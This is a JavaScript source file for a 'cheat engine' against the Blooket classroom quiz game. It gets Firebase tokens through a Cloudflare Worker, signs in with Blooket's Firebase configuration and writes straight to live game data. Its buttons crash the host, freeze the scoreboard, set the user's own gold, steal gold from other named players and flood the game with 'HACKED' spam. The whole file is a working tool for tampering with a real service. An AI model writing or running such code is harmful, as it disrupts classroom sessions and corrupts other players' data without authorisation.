// ============================================================
// BLOOKET CHEAT ENGINE - WORKER EDITION
// Uses YOUR Cloudflare Worker for token generation
// ============================================================

// ⚠️ REPLACE THIS WITH YOUR ACTUAL WORKER URL
const PROXY_URL = 'https://blooket-bot.thegreatsnowyfox2.workers.dev/';

let activeGame = null;
let db = null;
let auth = null;
let firebaseApp = null;

document.getElementById('joinBtn').onclick = async () => {
    const pin = document.getElementById('gamePin').value.trim();
    const name = document.getElementById('playerName').value.trim();
    
    if (!pin || !name) {
        updateStatus('❌ Enter both Game PIN and Nickname!');
        return;
    }
    
    updateStatus('🔑 Contacting Worker for token...');
    
    try {
        // Step 1: Call YOUR Worker's /join endpoint
        const response = await fetch(`${PROXY_URL}/join`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({ pin, name })
        });
        
        // Check if response is OK
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
        
        // Parse the JSON response
        const data = await response.json();
        console.log('Worker response:', data);
        
        // Check for success
        if (!data.success) {
            throw new Error(data.error || 'Worker returned error');
        }
        
        if (!data.fbToken || !data.fbShardURL) {
            throw new Error('Missing token from Worker');
        }
        
        updateStatus('🔥 Initializing Firebase...');
        
        // Step 2: Initialize Firebase with Blooket's config
        // Using the compat SDK (loaded via index.html)
        if (typeof firebase === 'undefined') {
            throw new Error('Firebase SDK not loaded. Check index.html script tags.');
        }
        
        firebaseApp = firebase.initializeApp({
            apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
            authDomain: "blooket-2020.firebaseapp.com",
            databaseURL: data.fbShardURL
        }, 'cheatApp');
        
        auth = firebase.auth();
        await auth.signInWithCustomToken(data.fbToken);
        db = firebase.database();
        
        activeGame = { pin, name };
        
        updateStatus('✅ CONNECTED! Cheats active.');
        document.getElementById('cheatPanel').style.display = 'block';
        
        // Load other players for steal dropdown
        loadPlayerList();
        
    } catch (error) {
        updateStatus('❌ Error: ' + error.message);
        console.error('Join error:', error);
        // Fallback to demo mode
        enableDemoMode();
    }
};

// === REAL CHEAT FUNCTIONS ===

function setUserVal(path, value) {
    if (!activeGame || !db) {
        alert('Not connected to a game!');
        return false;
    }
    try {
        const ref = db.ref(`/${activeGame.pin}/c/${activeGame.name}/${path}`);
        ref.set(value);
        console.log(`✅ Wrote to ${path}:`, value);
        return true;
    } catch (e) {
        console.error('Write error:', e);
        alert('Write failed: ' + e.message);
        return false;
    }
}

// CRASH HOST
document.getElementById('crashHostBtn').onclick = () => {
    const result = setUserVal('g/t', 't');
    if (result) updateStatus('💥 Crash sent! Host may freeze.');
};

// FREEZE SCOREBOARD
document.getElementById('freezeScoreboardBtn').onclick = () => {
    const result = setUserVal('tat/t', 't');
    if (result) updateStatus('❄️ Freeze sent! Scoreboard should lock.');
};

// SET GOLD
document.getElementById('setGoldBtn').onclick = () => {
    const amount = parseInt(document.getElementById('goldAmount').value) || 99999;
    const result = setUserVal('g', amount);
    if (result) updateStatus(`💰 Gold set to ${amount}!`);
};

// STEAL GOLD
document.getElementById('stealGoldBtn').onclick = () => {
    const target = document.getElementById('targetPlayer').value;
    const amount = document.getElementById('stealAmount').value || 100;
    if (!target) { alert('Select a target first!'); return; }
    const result = setUserVal('tat', `${target}:${amount}`);
    if (result) updateStatus(`💰 Stole ${amount} from ${target}!`);
};

// CHANGE BLOOK
document.getElementById('setBlookBtn').onclick = () => {
    const blook = document.getElementById('blookSelect').value;
    const result = setUserVal('b', blook);
    if (result) updateStatus(`🎭 Blook changed to ${blook}!`);
};

// LEAVE GAME
document.getElementById('leaveGameBtn').onclick = () => {
    if (activeGame && db) {
        db.ref(`/${activeGame.pin}/c/${activeGame.name}`).remove();
        updateStatus('🚪 Left game');
        document.getElementById('cheatPanel').style.display = 'none';
        activeGame = null;
        // Clean up Firebase app
        if (firebaseApp) {
            firebaseApp.delete();
            firebaseApp = null;
        }
    }
};

// FLOOD ALERT
document.getElementById('floodAlertBtn').onclick = () => {
    const floodText = 'HACKED '.repeat(1000);
    const result = setUserVal('tat', `${activeGame?.name || ''}:${Date.now()}${floodText}`);
    if (result) updateStatus('📢 Flood sent!');
};

// Load players for steal dropdown
async function loadPlayerList() {
    if (!activeGame || !db) return;
    try {
        const snapshot = await db.ref(`/${activeGame.pin}/c`).once('value');
        const players = snapshot.val();
        const select = document.getElementById('targetPlayer');
        select.innerHTML = '';
        for (let name in players) {
            if (name !== activeGame.name) {
                const option = document.createElement('option');
                option.value = name;
                const gold = players[name]?.g || 0;
                option.textContent = `${name} (💰 ${gold})`;
                select.appendChild(option);
            }
        }
    } catch (e) {
        console.error('Could not load players:', e);
    }
}

function updateStatus(msg) {
    const statusDiv = document.getElementById('status');
    if (statusDiv) statusDiv.innerHTML = `Status: ${msg}`;
    console.log(msg);
}

function enableDemoMode() {
    updateStatus('⚠️ DEMO MODE: Show explanations only');
    document.getElementById('cheatPanel').style.display = 'block';
    const btns = ['crashHostBtn', 'freezeScoreboardBtn', 'setGoldBtn', 'stealGoldBtn', 'setBlookBtn', 'floodAlertBtn'];
    btns.forEach(id => {
        const btn = document.getElementById(id);
        if (btn && !btn._demoListener) {
            const oldClick = btn.onclick;
            btn.onclick = () => alert('🔴 REAL CHEAT: Would write to Firebase.\n\nCheck Worker URL and connection.');
            btn._demoListener = true;
        }
    });
}

// Checkbox handler
document.querySelectorAll('checkbox').forEach(cb => {
    cb.addEventListener('click', function() {
        if(this.getAttribute('checked')) this.removeAttribute('checked');
        else this.setAttribute('checked', 'true');
    });
});

updateStatus('Ready');
console.log('🔬 Cheat engine loaded. Worker URL:', PROXY_URL);
